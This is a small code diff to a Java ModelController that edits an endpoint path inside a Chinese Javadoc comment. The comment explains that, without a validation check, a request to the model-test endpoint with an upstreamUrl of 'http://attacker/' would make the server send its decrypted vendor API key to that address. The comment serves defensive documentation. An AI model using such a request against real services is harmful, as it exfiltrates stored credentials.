@@ -205,7 +205,7 @@ public class ModelController {
      * <p><b>不加这道校验就是一个密钥外传通道</b>：{@code hasDraftConfig()} 只要求
      * {@code upstreamUrl} 非空，{@code requiresSavedCredential()} 在 {@code credential == null}
      * 时返回 true——于是一个
-     * {@code POST /modelgate/models/test?modelId=<任一已存在模型>} 配
+     * {@code POST /models/test?modelId=<任一已存在模型>} 配
      * {@code {"upstreamUrl":"http://attacker/"}} 的请求，就会让服务端把库中解密后的
      * 上游厂商密钥写进请求头、POST 到调用方指定的地址，上游响应还回显给调用方。
      * 它绕开了 {@code ModelVO} "secretKey 任何情况下都不下发" 那道防线，
